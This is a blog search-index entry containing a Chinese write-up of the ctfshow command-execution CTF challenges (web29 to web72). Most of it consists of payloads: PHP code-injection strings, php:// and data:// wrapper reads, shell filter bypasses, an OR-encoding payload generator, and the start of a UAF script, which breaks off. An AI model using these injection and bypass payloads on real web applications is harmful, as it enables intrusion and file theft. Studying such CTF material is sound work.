<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ctfshow命令执行</title>
      <link href="/2025/03/13/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2025/03/13/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo `nl fl&#x27;&#x27;ag.php`;</span><br></pre></td></tr></table></figure><h2 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo `nl fl&#x27;&#x27;ag.p&#x27;&#x27;hp`;</span><br></pre></td></tr></table></figure><h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure><h2 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=$nice=include$_GET[&quot;url&quot;]?&gt;&amp;url=php://filter/read=convert.base64-</span><br><span class="line">encode/resource=flag.php</span><br></pre></td></tr></table></figure><h2 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=?&gt;&lt;?=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-</span><br><span class="line">encode/resource=flag.php</span><br></pre></td></tr></table></figure><h2 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-</span><br><span class="line">encode/resource=flag.php</span><br></pre></td></tr></table></figure><h2 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-</span><br><span class="line">encode/resource=flag.php</span><br></pre></td></tr></table></figure><h2 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-</span><br><span class="line">encode/resource=flag.php</span><br></pre></td></tr></table></figure><h2 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span><br></pre></td></tr></table></figure><h2 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nginx的日志文件/var/log/nginx/access.log</span><br><span class="line">&lt;?php system(&#x27;cat flag.php&#x27;);?&gt;</span><br><span class="line">data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span><br></pre></td></tr></table></figure><h2 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data://text/plain,&lt;? = system(&quot;tac fla*.php&quot;) ;? &gt;//</span><br></pre></td></tr></table></figure><h2 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">无参数RCE</span><br><span class="line">c=eval(array_pop(next(get_defined_vars())));//需要POST传入参数为1=system(&#x27;tac fl*&#x27;);</span><br><span class="line">c=show_source(next(array_reverse(scandir(pos(localeconv()))))); 或者 c=show_source(next(array_reverse(scandir(getcwd()))));</span><br></pre></td></tr></table></figure><h2 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$P</span> = <span class="string">&#x27;/[0-9]|[a-z]|\^|\+|~|\$|\[|]|\&#123;|&#125;|&amp;|-/i&#x27;</span>;</span><br><span class="line"><span class="variable">$res1</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$res2</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;cat flag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$len</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$target</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$loop</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$n1</span> = <span class="number">0</span>; <span class="variable">$n1</span> &lt; <span class="number">256</span>; <span class="variable">$n1</span>++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$loop</span>) <span class="keyword">break</span>;</span><br><span class="line">        <span class="variable">$n1Hex</span> = <span class="variable">$n1</span> &lt; <span class="number">16</span> ? <span class="string">&#x27;0&#x27;</span> . <span class="title function_ invoke__">dechex</span>(<span class="variable">$n1</span>) : <span class="title function_ invoke__">dechex</span>(<span class="variable">$n1</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$P</span>, <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$n1Hex</span>))) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$n2</span> = <span class="number">0</span>; <span class="variable">$n2</span> &lt; <span class="number">256</span>; <span class="variable">$n2</span>++) &#123;</span><br><span class="line">            <span class="variable">$n2Hex</span> = <span class="variable">$n2</span> &lt; <span class="number">16</span> ? <span class="string">&#x27;0&#x27;</span> . <span class="title function_ invoke__">dechex</span>(<span class="variable">$n2</span>) : <span class="title function_ invoke__">dechex</span>(<span class="variable">$n2</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$P</span>, <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$n2Hex</span>))) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="variable">$n1UrlEncode</span> = <span class="string">&#x27;%&#x27;</span> . <span class="variable">$n1Hex</span>;</span><br><span class="line">            <span class="variable">$n2UrlEncode</span> = <span class="string">&#x27;%&#x27;</span> . <span class="variable">$n2Hex</span>;</span><br><span class="line">            <span class="variable">$orRes</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$n1UrlEncode</span>) | <span class="title function_ invoke__">urldecode</span>(<span class="variable">$n2UrlEncode</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$orRes</span> === <span class="variable">$target</span>[<span class="variable">$i</span>]) &#123;</span><br><span class="line">                <span class="variable">$res1</span> .= <span class="variable">$n1UrlEncode</span>;</span><br><span class="line">                <span class="variable">$res2</span> .= <span class="variable">$n2UrlEncode</span>;</span><br><span class="line">                <span class="variable">$loop</span> = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;\&#x27;&#x27;</span> . <span class="variable">$res1</span> . <span class="string">&#x27;\&#x27;&#x27;</span> . <span class="string">&#x27;|&#x27;</span> . <span class="string">&#x27;\&#x27;&#x27;</span> . <span class="variable">$res2</span> . <span class="string">&#x27;\&#x27;&#x27;</span>;</span><br></pre></td></tr></table></figure><h2 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">使用 &quot; ; &quot; &quot; || &quot; &quot; &amp; &quot; &quot; &amp;&amp; &quot; 分隔</span><br><span class="line"></span><br><span class="line">/dev/null 2&gt;&amp;1 意思是将标准输出和标准错误都重定向到 /dev/null 即不回显</span><br><span class="line">; //分号</span><br><span class="line">| //只执行后面那条命令</span><br><span class="line">|| //只执行前面那条命令</span><br><span class="line">&amp; //两条命令都会执行</span><br><span class="line">&amp;&amp; //两条命令都会执行</span><br></pre></td></tr></table></figure><h2 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nl flag.php%0a</span><br></pre></td></tr></table></figure><h2 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nl fla*.php%0a</span><br></pre></td></tr></table></figure><h2 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo$IFS`tac$IFS*`%0A</span><br></pre></td></tr></table></figure><h2 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nl&lt;fla&#x27;&#x27;g.php||</span><br></pre></td></tr></table></figure><h2 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=ca\t&lt;fl\ag.php||</span><br></pre></td></tr></table></figure><h2 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/?c=tac&lt;fla%27%27g.php||</span><br></pre></td></tr></table></figure><h2 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=tac%09fla?.php%26%26ls</span><br></pre></td></tr></table></figure><h2 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=tac&lt;fl%27%27ag.php||</span><br></pre></td></tr></table></figure><h2 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=t&#x27;&#x27;ac&lt;fl&#x27;&#x27;ag.php%0a</span><br></pre></td></tr></table></figure><h2 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nl$IFS/fla&#x27;&#x27;g||</span><br></pre></td></tr></table></figure><h2 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c&#x27;&#x27;at$&#123;IFS&#125;fla&#x27;&#x27;g.p&#x27;&#x27;hp</span><br><span class="line">ta\c$&#123;IFS&#125;fla\g.php或者把\换成&#x27;&#x27;也行</span><br></pre></td></tr></table></figure><h2 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/bin/?at$&#123;IFS&#125;f???????</span><br><span class="line">mv flag.php t.txt</span><br><span class="line">c??$&#123;IFS&#125;????????</span><br><span class="line">c= mv$&#123;IFS&#125;fla?.php$&#123;IFS&#125;a.txt  c=uniq$&#123;IFS&#125;a.txt </span><br><span class="line">c=uniq$&#123;IFS&#125;f???.php</span><br></pre></td></tr></table></figure><h2 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bash无字母命令执行</span><br><span class="line">使用$&#x27;\154\163&#x27;(或者$&#x27;\x6c\x73&#x27;)会执行ls</span><br><span class="line"></span><br><span class="line">故payload是/?c=$&#x27;\143\141\164&#x27;%20*</span><br></pre></td></tr></table></figure><h2 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没有过滤 <code>.</code>, 在 Linux 中.类似于 source 命令即执行 bash 文件,</p><p>写一个可上传文件的小网页, 传入参数?c =.+/???/????????[@-[]</p><p>[@-[] 相当于 [64-91] (ascii 码)(A = 65 Z = 90) </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>抓包在文件上传处上传 1.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP在处理一个文件上传的请求数据包时，会将目标文件流保存到临时目录下，并且会以PHP+随机六位字符串进行保存（php[0-9A-Za-z]&#123;3,4,5,6&#125;)，而一个文件流的处理有存活周期，在php运行的过程中，假如php非正常结束，比如崩溃，那么这个临时文件就会永久的保留。如果php正常的结束，并且该文件没有被移动到其它地方也没有被改名，则该文件将在表单请求结束时被删除。在这期间，一个临时文件存活时间大概有30s</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">cat</span> flag.php</span><br></pre></td></tr></table></figure><h2 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">echo $&#123;#&#125; //0 echo $&#123;##&#125; //1 echo $(($&#123;##&#125;+$&#123;##&#125;)) //2 echospan><br><span class="line"></span><br><span class="line">通过$(())操作构造出36： $(()) ：代表做一次运算，因为里面为空，也表示值为0</span><br><span class="line">$(( ~$(()) )) ：对0作取反运算，值为-1</span><br><span class="line">$(( $((~$(()))) $((~$(()))) ))： -1-1，也就是(-1)+(-1)为-2，所以值为-2</span><br><span class="line">$(( ~$(( $((~$(()))) $((~$(()))) )) )) ：再对-2做一次取反得到1，所以值为1</span><br><span class="line">故我们在$(( ~$(( )) ))里面放37个$((~$(())))，得到-37，取反即可得到36:</span><br></pre></td></tr></table></figure><h2 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">eval在php里面是执行代码层面的函数，无法直接执行linux命令</span><br><span class="line">c=show_source(&#x27;flag.php&#x27;);</span><br><span class="line">c=include($_POST[&#x27;w&#x27;]);&amp;w=php://filter/convert.base64-encode/resource=flag.php</span><br><span class="line">无参数读取 show_source(array_rand(array_flip(scandir(getcwd()))))</span><br></pre></td></tr></table></figure><h2 id="web59"><a href="#web59" class="headerlink" title="web59"></a>web59</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=print_r(scandir(dirname(&#x27;FILE&#x27;)));</span><br><span class="line">highlight_file(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure><h2 id="web60"><a href="#web60" class="headerlink" title="web60"></a>web60</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=print_r(scandir(dirname(&#x27;FILE&#x27;)));</span><br><span class="line">highlight_file(&quot;flag.php&quot;);</span><br><span class="line">c=include$_POST[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h2 id="web61"><a href="#web61" class="headerlink" title="web61"></a>web61</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=print_r(scandir(dirname(&#x27;FILE&#x27;)));</span><br></pre></td></tr></table></figure><h2 id="web62"><a href="#web62" class="headerlink" title="web62"></a>web62</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=highlight_file(&quot;flag.php&quot;);或者c=show_source(&quot;flag.php&quot;);</span><br><span class="line">c=include($_POST[&#x27;w&#x27;]);&amp;w=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h2 id="web63"><a href="#web63" class="headerlink" title="web63"></a>web63</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web64"><a href="#web64" class="headerlink" title="web64"></a>web64</h2><h2 id="web65"><a href="#web65" class="headerlink" title="web65"></a>web65</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(next(array_reverse(scandir(pos(localeconv())))))</span><br></pre></td></tr></table></figure><h2 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=print_r(scandir(&quot;/&quot;));</span><br><span class="line">c=highlight_file(&#x27;/flag.txt&#x27;);</span><br></pre></td></tr></table></figure><h2 id="web67"><a href="#web67" class="headerlink" title="web67"></a>web67</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">查看根目录内容</span><br><span class="line">c=var_dump(scandir(&quot;/&quot;));</span><br><span class="line">查看文件内容</span><br><span class="line">POST传参：c=highlight_file(&quot;/flag.txt&quot;);</span><br><span class="line">POST传参：c=include($_POST[&#x27;w&#x27;]);&amp;w=php://filter/convert.base64-encode/resource=/flag.txt</span><br></pre></td></tr></table></figure><h2 id="web68"><a href="#web68" class="headerlink" title="web68"></a>web68</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=var_dump(scandir(&quot;/&quot;)); c=readgzfile(&quot;/flag.txt&quot;);</span><br><span class="line">试试include和require即可</span><br><span class="line">var_dump((new SplFileObject(&quot;flag.txt&quot;))-&gt;fpassthru());</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web69"><a href="#web69" class="headerlink" title="web69"></a>web69</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">读取函数readgzfile：可以读取非gz格式的文件,echo无法输出数组</span><br><span class="line">?c=echo(implode(&#x27;---&#x27;,scandir(&quot;/&quot;))); ?c=readgzfile(&#x27;/flag.txt&#x27;);</span><br></pre></td></tr></table></figure><h2 id="web70"><a href="#web70" class="headerlink" title="web70"></a>web70</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用c=var_export(scandir(&#x27;/&#x27;));依然可以读取根目录下的文件列表。之后即可include或require</span><br></pre></td></tr></table></figure><h2 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">用exit()/die()提前结束程序</span><br><span class="line">$s = ob_get_contents();//得到缓冲区的数据。</span><br><span class="line">ob_end_clean();//会清除缓冲区的内容，并将缓冲区关闭，但不会输出内容</span><br><span class="line">c=var_export(scandir(&#x27;/&#x27;));exit();</span><br><span class="line">c=include(&quot;/flag.txt&quot;);die();</span><br></pre></td></tr></table></figure><h2 id="web72"><a href="#web72" class="headerlink" title="web72"></a>web72</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>); <span class="comment">// 创建一个DirectoryIterator对象，遍历根目录</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>) &#123; <span class="comment">// 遍历每个条目</span></span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>() . <span class="string">&#x27; &#x27;</span>); <span class="comment">// 输出条目的名称，并添加一个空格</span></span><br><span class="line">&#125;</span><br><span class="line">发现flag0.txt</span><br><span class="line">使用uaf脚本进行命令执行</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span 